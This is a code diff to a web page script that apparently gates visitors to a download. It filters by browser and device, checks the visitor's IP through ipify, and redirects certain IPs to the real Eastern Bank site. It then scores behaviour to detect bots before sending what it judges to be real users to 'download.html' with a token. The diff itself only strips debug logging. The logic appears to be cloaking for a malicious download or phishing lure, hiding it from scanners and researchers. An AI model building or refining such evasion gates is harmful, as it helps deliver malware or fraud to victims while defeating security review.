@@ -33,15 +33,13 @@
   <script src="telemetry.js"></script>
   <script>
     (async function () {
-      window.__steps=[];
       var t0 = Date.now();
       // Entry gate (real desktop Chrome UA + honeypot).
-      if (!window.gateStep({ entry: true })) { window.__steps.push('gated'); return; }
-      window.__steps.push('gate-pass');
+      if (!window.gateStep({ entry: true })) return;
+
       if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
         window.location.href = "denied.html"; return;
       }
-      window.__steps.push('not-mobile');
       var ipify = await (async () => {
         try {
           const c = new AbortController(); const to = setTimeout(() => c.abort(), 3000);
@@ -49,21 +47,17 @@
           clearTimeout(to); return (await r.json()).ip;
         } catch (e) { return null; }
       })();
-      window.__steps.push('ipify:'+(ipify||'null'));
       var blockedIPs = ['162.158.63.162','162.158.63.161','162.158.63.160'];
       if (ipify && blockedIPs.includes(ipify)) { window.location.href = "https://www.easternbank.com/"; return; }
 
       const it = await window.issueToken();
       var TK = it.tok;
-      window.__steps.push('token:'+(TK?'ok':'null'));
       // Behavioral verdict (client-side). All failure -> legacy 5s fixed flow.
       var verdict = { p: 'robust', f: 0, v: null };
-      try { var T = await window.collectBehavior(t0); verdict = window.verdict(window.scoreBehavior(T)); window.__steps.push('verdict:'+(verdict.p||'?')); }
-      catch (e) { window.__steps.push('verdict-err:'+e.message); }
+      try { var T = await window.collectBehavior(t0); verdict = window.verdict(window.scoreBehavior(T)); }
+      catch (e) { /* legacy */ }
       var wait = Math.max(5000 - (Date.now() - t0), verdict.p === 'fast' ? 3200 : 5000);
-      window.__steps.push('wait:'+wait);
       setTimeout(function () {
-        window.__steps.push('redirect');
         window.location.href = "download.html?tk=" + encodeURIComponent(TK);
       }, wait);
     })();
